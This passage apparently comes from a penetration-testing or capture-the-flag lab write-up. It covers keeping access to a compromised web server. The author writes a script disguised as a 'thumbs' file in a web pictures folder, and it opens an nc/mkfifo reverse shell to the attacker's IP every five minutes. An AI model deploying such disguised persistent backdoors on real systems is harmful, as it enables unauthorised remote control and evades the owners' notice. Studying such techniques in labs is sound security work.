Maintaining Access


Since SSH is open on the victim, I checked to see if the www user has a default home directory and shell defined.

$ grep `whoami` /etc/passwd
www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin

The home directory doesn't exists, and the default shell is set to '/usr/sbin/nologin', so I won't be able to SSH to the box with this account.

I decided to create a simple shell script that will try to connect back to my attacking machine every 5 minutes. I placed the script in theÂ /usr/local/www/apache22/data2/phptax/pictures directory and called it 'thumbs'.

$ cd pictures
$Â cat <<EOF > thumbs
#!/bin/sh
while true; do
Â Â Â Â rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.183.0.222 5432 >/tmp/f
Â Â Â Â # sleep for 300 seconds (5 mins)
Â Â Â Â sleep 300
done
EOF
$ chmod +x thumbs
$ ./thumbs &

With the script now running in the background, if I get disconnected, I should be able to restart a listener and get back in within 5 minutes.
